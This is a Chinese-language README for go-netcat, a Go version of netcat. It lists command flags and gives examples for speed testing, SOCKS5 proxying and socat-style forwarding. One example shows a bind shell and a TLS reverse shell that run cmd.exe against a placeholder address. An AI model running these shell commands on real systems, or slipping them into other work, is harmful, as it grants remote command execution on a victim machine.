## go-netcat 简介
   golang版 netcat
   
## 使用方法
```
Usage of gonc.exe:
  -C    enable CRLF
  -auth string
        user:password (for SOCKS5 proxy)
  -bind string
        ip:port
  -exec string
        runs a command for each connection
  -inprogress
        show transfer progress
  -keep-open
        keep listening after client disconnects
  -l    listen mode
  -outprogress
        show transfer progress
  -s5 string
        ip:port (SOCKS5 proxy)
  -sendfile string
        path to file to send (optional)
  -sni string

  -stderr
        when -exec, Merge stderr into stdout
  -tls
        Enable TLS connection
  -tls10

  -tls11

  -tls12

  -tls13

  -u    use UDP protocol
```

## 例子
- 发送和统计传输速度，内置/dev/zero和/dev/urandom实现，这样windows下也可以

    `gonc.exe -sendfile /dev/zero -outprogress x.x.x.x 1234`

    `13040386048 bytes (12.1 GiB) copied, 00:00:04, 2.6 GiB/s`

    另一端用

    `gonc.exe -l 1234 > NUL`

- 支持使用socks5代理

    `gonc.exe -s5 s.s.s.s:port x.x.x.x 1234`

- 支持监听或反弹shell
    
    监听

    `gonc.exe -tls -keep-open -exec cmd.exe -stderr -l 1234`

    反弹

    `gonc.exe -tls -exec cmd.exe -stderr x.x.x.x 1234`

- 还可以像socat那样建立左右两个通道转发数据

    `gonc.exe -keep-open -exec "./gonc -tls www.baidu.com 443" -l 8000`
    
    另一端用

    `gonc.exe 127.0.0.1 8000 > NUL`
